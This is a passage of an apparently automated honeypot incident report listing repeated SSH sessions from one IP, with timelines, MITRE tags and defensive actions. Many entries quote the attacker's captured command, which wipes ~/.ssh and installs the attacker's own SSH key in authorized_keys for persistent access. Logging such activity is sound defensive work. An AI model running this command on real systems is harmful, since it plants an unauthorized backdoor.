| `2026-05-02 20:34:14` | `cowrie.command.input` |
| `2026-05-02 20:34:14` | `cowrie.session.file_download` |
| `2026-05-02 20:34:14` | `cowrie.log.closed` |
| `2026-05-02 20:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b703e327099c

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:34 |
| **Last Seen** | 2026-05-02 20:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:34:16` | `cowrie.session.connect` |
| `2026-05-02 20:34:16` | `cowrie.client.version` |
| `2026-05-02 20:34:16` | `cowrie.client.kex` |
| `2026-05-02 20:34:16` | `cowrie.login.success` |
| `2026-05-02 20:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba4d7399833

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:35 |
| **Last Seen** | 2026-05-02 20:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:35:08` | `cowrie.session.connect` |
| `2026-05-02 20:35:08` | `cowrie.client.version` |
| `2026-05-02 20:35:08` | `cowrie.client.kex` |
| `2026-05-02 20:35:08` | `cowrie.login.success` |
| `2026-05-02 20:35:08` | `cowrie.session.params` |
| `2026-05-02 20:35:08` | `cowrie.command.input` |
| `2026-05-02 20:35:08` | `cowrie.command.failed` |
| `2026-05-02 20:35:08` | `cowrie.log.closed` |
| `2026-05-02 20:35:09` | `cowrie.session.params` |
| `2026-05-02 20:35:09` | `cowrie.command.input` |
| `2026-05-02 20:35:09` | `cowrie.session.file_download` |
| `2026-05-02 20:35:09` | `cowrie.log.closed` |
| `2026-05-02 20:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67cee707360

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:35 |
| **Last Seen** | 2026-05-02 20:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:35:10` | `cowrie.session.connect` |
| `2026-05-02 20:35:10` | `cowrie.client.version` |
| `2026-05-02 20:35:10` | `cowrie.client.kex` |
| `2026-05-02 20:35:11` | `cowrie.login.success` |
| `2026-05-02 20:35:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f30671cdf5

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:36 |
| **Last Seen** | 2026-05-02 20:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:36:10` | `cowrie.session.connect` |
| `2026-05-02 20:36:10` | `cowrie.client.version` |
| `2026-05-02 20:36:10` | `cowrie.client.kex` |
| `2026-05-02 20:36:10` | `cowrie.login.success` |
| `2026-05-02 20:36:10` | `cowrie.session.params` |
| `2026-05-02 20:36:10` | `cowrie.command.input` |
| `2026-05-02 20:36:10` | `cowrie.command.failed` |
| `2026-05-02 20:36:10` | `cowrie.log.closed` |
| `2026-05-02 20:36:11` | `cowrie.session.params` |
| `2026-05-02 20:36:11` | `cowrie.command.input` |
| `2026-05-02 20:36:11` | `cowrie.session.file_download` |
| `2026-05-02 20:36:11` | `cowrie.log.closed` |
| `2026-05-02 20:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6315f941675b

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:36 |
| **Last Seen** | 2026-05-02 20:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:36:12` | `cowrie.session.connect` |
| `2026-05-02 20:36:12` | `cowrie.client.version` |
| `2026-05-02 20:36:13` | `cowrie.client.kex` |
| `2026-05-02 20:36:13` | `cowrie.login.success` |
| `2026-05-02 20:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2539eefbc9f4

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:37 |
| **Last Seen** | 2026-05-02 20:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:37:10` | `cowrie.session.connect` |
| `2026-05-02 20:37:10` | `cowrie.client.version` |
| `2026-05-02 20:37:10` | `cowrie.client.kex` |
| `2026-05-02 20:37:10` | `cowrie.login.success` |
| `2026-05-02 20:37:10` | `cowrie.session.params` |
| `2026-05-02 20:37:10` | `cowrie.command.input` |
| `2026-05-02 20:37:10` | `cowrie.command.failed` |
| `2026-05-02 20:37:10` | `cowrie.log.closed` |
| `2026-05-02 20:37:11` | `cowrie.session.params` |
| `2026-05-02 20:37:11` | `cowrie.command.input` |
| `2026-05-02 20:37:11` | `cowrie.session.file_download` |
| `2026-05-02 20:37:11` | `cowrie.log.closed` |
| `2026-05-02 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f91c1b636a1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:37 |
| **Last Seen** | 2026-05-02 20:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:37:12` | `cowrie.session.connect` |
| `2026-05-02 20:37:12` | `cowrie.client.version` |
| `2026-05-02 20:37:13` | `cowrie.client.kex` |
| `2026-05-02 20:37:13` | `cowrie.login.success` |
| `2026-05-02 20:37:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb3981b44c1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:38 |
| **Last Seen** | 2026-05-02 20:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:38:09` | `cowrie.session.connect` |
| `2026-05-02 20:38:09` | `cowrie.client.version` |
| `2026-05-02 20:38:09` | `cowrie.client.kex` |
| `2026-05-02 20:38:10` | `cowrie.login.success` |
| `2026-05-02 20:38:10` | `cowrie.session.params` |
| `2026-05-02 20:38:10` | `cowrie.command.input` |
| `2026-05-02 20:38:10` | `cowrie.command.failed` |
| `2026-05-02 20:38:10` | `cowrie.log.closed` |
| `2026-05-02 20:38:10` | `cowrie.session.params` |
| `2026-05-02 20:38:10` | `cowrie.command.input` |
| `2026-05-02 20:38:10` | `cowrie.session.file_download` |
| `2026-05-02 20:38:10` | `cowrie.log.closed` |
| `2026-05-02 20:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0140b72e925

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:38 |
| **Last Seen** | 2026-05-02 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:38:12` | `cowrie.session.connect` |
| `2026-05-02 20:38:12` | `cowrie.client.version` |
| `2026-05-02 20:38:12` | `cowrie.client.kex` |
| `2026-05-02 20:38:12` | `cowrie.login.success` |
| `2026-05-02 20:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d189b1007c

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:41 |
| **Last Seen** | 2026-05-02 20:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:41:07` | `cowrie.session.connect` |
| `2026-05-02 20:41:07` | `cowrie.client.version` |
| `2026-05-02 20:41:07` | `cowrie.client.kex` |
| `2026-05-02 20:41:07` | `cowrie.login.success` |
| `2026-05-02 20:41:07` | `cowrie.session.params` |
| `2026-05-02 20:41:07` | `cowrie.command.input` |
| `2026-05-02 20:41:07` | `cowrie.command.failed` |
| `2026-05-02 20:41:07` | `cowrie.log.closed` |
| `2026-05-02 20:41:08` | `cowrie.session.params` |
| `2026-05-02 20:41:08` | `cowrie.command.input` |
| `2026-05-02 20:41:08` | `cowrie.session.file_download` |
| `2026-05-02 20:41:08` | `cowrie.log.closed` |
| `2026-05-02 20:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef188ed75527

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:41 |
| **Last Seen** | 2026-05-02 20:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:41:09` | `cowrie.session.connect` |
| `2026-05-02 20:41:09` | `cowrie.client.version` |
| `2026-05-02 20:41:09` | `cowrie.client.kex` |
| `2026-05-02 20:41:10` | `cowrie.login.success` |
| `2026-05-02 20:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57133b1923e5

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:42 |
| **Last Seen** | 2026-05-02 20:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:42:09` | `cowrie.session.connect` |
| `2026-05-02 20:42:09` | `cowrie.client.version` |
| `2026-05-02 20:42:09` | `cowrie.client.kex` |
| `2026-05-02 20:42:09` | `cowrie.login.success` |
| `2026-05-02 20:42:10` | `cowrie.session.params` |
| `2026-05-02 20:42:10` | `cowrie.command.input` |
| `2026-05-02 20:42:10` | `cowrie.command.failed` |
| `2026-05-02 20:42:10` | `cowrie.log.closed` |
| `2026-05-02 20:42:10` | `cowrie.session.params` |
| `2026-05-02 20:42:10` | `cowrie.command.input` |
| `2026-05-02 20:42:10` | `cowrie.session.file_download` |
| `2026-05-02 20:42:10` | `cowrie.log.closed` |
| `2026-05-02 20:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6fc9f40b0fd

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:42 |
| **Last Seen** | 2026-05-02 20:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:42:12` | `cowrie.session.connect` |
| `2026-05-02 20:42:12` | `cowrie.client.version` |
| `2026-05-02 20:42:12` | `cowrie.client.kex` |
| `2026-05-02 20:42:12` | `cowrie.login.success` |
| `2026-05-02 20:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba41a07d8e1

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:43 |
| **Last Seen** | 2026-05-02 20:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:43:10` | `cowrie.session.connect` |
| `2026-05-02 20:43:10` | `cowrie.client.version` |
| `2026-05-02 20:43:10` | `cowrie.client.kex` |
| `2026-05-02 20:43:10` | `cowrie.login.success` |
| `2026-05-02 20:43:10` | `cowrie.session.params` |
| `2026-05-02 20:43:10` | `cowrie.command.input` |
| `2026-05-02 20:43:10` | `cowrie.command.failed` |
| `2026-05-02 20:43:10` | `cowrie.log.closed` |
| `2026-05-02 20:43:11` | `cowrie.session.params` |
| `2026-05-02 20:43:11` | `cowrie.command.input` |
| `2026-05-02 20:43:11` | `cowrie.session.file_download` |
| `2026-05-02 20:43:11` | `cowrie.log.closed` |
| `2026-05-02 20:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826a1fe8aead

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:43 |
| **Last Seen** | 2026-05-02 20:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:43:13` | `cowrie.session.connect` |
| `2026-05-02 20:43:13` | `cowrie.client.version` |
| `2026-05-02 20:43:13` | `cowrie.client.kex` |
| `2026-05-02 20:43:13` | `cowrie.login.success` |
| `2026-05-02 20:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09ada617d21e

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:44 |
| **Last Seen** | 2026-05-02 20:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:44:14` | `cowrie.session.connect` |
| `2026-05-02 20:44:14` | `cowrie.client.version` |
| `2026-05-02 20:44:14` | `cowrie.client.kex` |
| `2026-05-02 20:44:14` | `cowrie.login.success` |
| `2026-05-02 20:44:15` | `cowrie.session.params` |
| `2026-05-02 20:44:15` | `cowrie.command.input` |
| `2026-05-02 20:44:15` | `cowrie.command.failed` |
| `2026-05-02 20:44:15` | `cowrie.log.closed` |
| `2026-05-02 20:44:15` | `cowrie.session.params` |
| `2026-05-02 20:44:15` | `cowrie.command.input` |
| `2026-05-02 20:44:15` | `cowrie.session.file_download` |
| `2026-05-02 20:44:15` | `cowrie.log.closed` |
| `2026-05-02 20:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce323eeb5148

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:44 |
| **Last Seen** | 2026-05-02 20:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:44:17` | `cowrie.session.connect` |
| `2026-05-02 20:44:17` | `cowrie.client.version` |
| `2026-05-02 20:44:17` | `cowrie.client.kex` |
| `2026-05-02 20:44:17` | `cowrie.login.success` |
| `2026-05-02 20:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab751202b4f6

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:45 |
| **Last Seen** | 2026-05-02 20:45 |
| **Session Duration** | 3s |
